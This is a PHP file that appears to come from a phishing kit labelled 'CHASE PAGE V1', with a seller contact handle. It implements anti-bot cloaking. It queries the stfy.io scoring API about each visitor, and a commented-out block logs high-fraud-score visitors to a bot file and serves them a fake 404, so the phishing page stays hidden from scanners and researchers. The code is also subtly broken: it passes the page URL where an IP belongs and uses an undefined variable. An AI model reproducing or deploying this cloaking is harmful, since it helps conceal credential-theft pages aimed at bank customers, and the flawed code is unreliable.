<?php
    /*
    |--------------------------------------------------------------------------
    | CHASE PAGE V1
    |--------------------------------------------------------------------------
    |
    | Contact me : @zroxo
    |
    */
error_reporting(0);
$lp = $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
$ip_ad = $_SERVER['HTTP_CLIENT_IP'];
// Check ip On STFY api.
$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, "https://stfy.io/api/json/?ip=".$lp."");
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 5);
$json = curl_exec($curl);
curl_close($curl);
/*
$result = json_decode($json, true);
if ($result['fraud_score'] >= 80) {
         $content1 = "#> ".$ip." [ Fraud score ] \r\n";
         $save1=fopen("admin/result/bot.txt","a+");
         fwrite($save1,$content1);
         fclose($save1);
         header("HTTP/1.0 404 Not Found");exit();
}
*/
?>